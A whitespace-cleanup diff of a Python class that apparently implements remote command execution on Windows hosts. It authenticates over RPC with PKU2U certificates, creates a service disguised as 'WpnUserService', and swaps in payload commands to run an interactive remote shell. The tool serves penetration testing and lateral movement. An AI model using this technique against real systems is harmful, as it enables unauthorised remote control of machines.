@@ -50,7 +50,7 @@ class RPC():
         stringbinding = epm.hept_map(self.target, scmr.MSRPC_UUID_SCMR, protocol='ncacn_ip_tcp')
         if stringbinding is None:
             return False
-                
+
         rpctransport = transport.DCERPCTransportFactory(stringbinding)
         self.dce = rpctransport.get_dce_rpc()
         self.dce.set_credentials('', '', 'WELLKNOWN:PKU2U', '', '', '', p2ppfx=self.pfx, p2ppfxpass=self.pfxpass)
@@ -65,7 +65,7 @@ class RPC():
 
     def start(self):
         try:
-            resp = scmr.hROpenSCManagerW(self.dce)        
+            resp = scmr.hROpenSCManagerW(self.dce)
             self.sc_handle = resp['lpScHandle']
         except DCERPCException as e:
             return
@@ -73,13 +73,13 @@ class RPC():
         self.servicename = f'WpnUserService_{random_str}'
         resp = scmr.hRCreateServiceW(self.dce, self.sc_handle, self.servicename, self.servicename,
                                     lpBinaryPathName='cmd.exe', dwStartType=scmr.SERVICE_DEMAND_START)
-        self.service_handle = resp['lpServiceHandle']   
-        
+        self.service_handle = resp['lpServiceHandle']
+
         cmd_res = self.exec('pwd')
         path = cmd_res[:-2]
         while True:
             try:
-                cmd = input('%s>' % path)                
+                cmd = input('%s>' % path)
                 print(self.exec(cmd))
             except KeyboardInterrupt as e:
                 self.end()
@@ -87,10 +87,10 @@ class RPC():
         return
 
     def exec(self, cmd):
-        payload = self.create_payload(cmd)        
+        payload = self.create_payload(cmd)
         scmr.hRChangeServiceConfigW(self.dce, self.service_handle, lpBinaryPathName=payload)
         try:
-            scmr.hRStartServiceW(self.dce, self.service_handle)            
+            scmr.hRStartServiceW(self.dce, self.service_handle)
         except:
             pass
 
